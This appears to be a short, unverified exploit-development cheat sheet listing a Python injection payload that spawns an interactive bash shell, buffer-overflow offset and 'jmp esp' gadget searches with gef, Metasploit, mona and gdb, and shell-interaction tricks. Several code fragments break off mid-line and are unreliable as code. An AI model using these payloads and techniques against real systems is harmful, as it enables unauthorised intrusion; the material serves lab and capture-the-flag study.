---
id: 5d594502-5f8e-4471-8c23-a0ace9742a5a
name: misc
type: cheatsheet
verified: false
created_at: '2020-07-14T18:15:02.763012+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# misc

**Command** ([[python injected shell]]):

```bash
__builtins__.__import__('os').system('/bin/bash -i')

```

# exploit development - finding offset

**Command** ([[gef]]):

```bash
pattern create 128
pattern search 0x6161616

```

**Command** ([[msf]]):

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP-Content>

```

**Code**: [[python3
from pwn import *
# n = 4 == 32Bit; n = 8 ]]

**Command** ([[find "jmp esp" with mona.py]]):

```bash
!mona find -type instr -s "jmp esp" -m <DLL>

```

**Code**: [[python
b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\]]

# gdb

**Command** ([[list memory of process]]):

```bash
info files

```

**Command** ([[find "jmp esp" with gdb]]):

```bash
find /b <from addr>, <to addr>, 0xff, 0xe4

```

**Command** ([[list shared modules]]):

```bash
info sharedlibrary

```

**Command** ([[serve binary via network]]):

```bash
socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./binary"

```

**Code**: [[python
import struct
def p64(x):
    return pack("]]

**Code**: [[python
#!/usr/bin/python3
import requests
from cmd]]

# interactive shells

**Command** ([[cat technique]]):

```bash
(cat exploit.txt; cat) | ./vulnapp

```
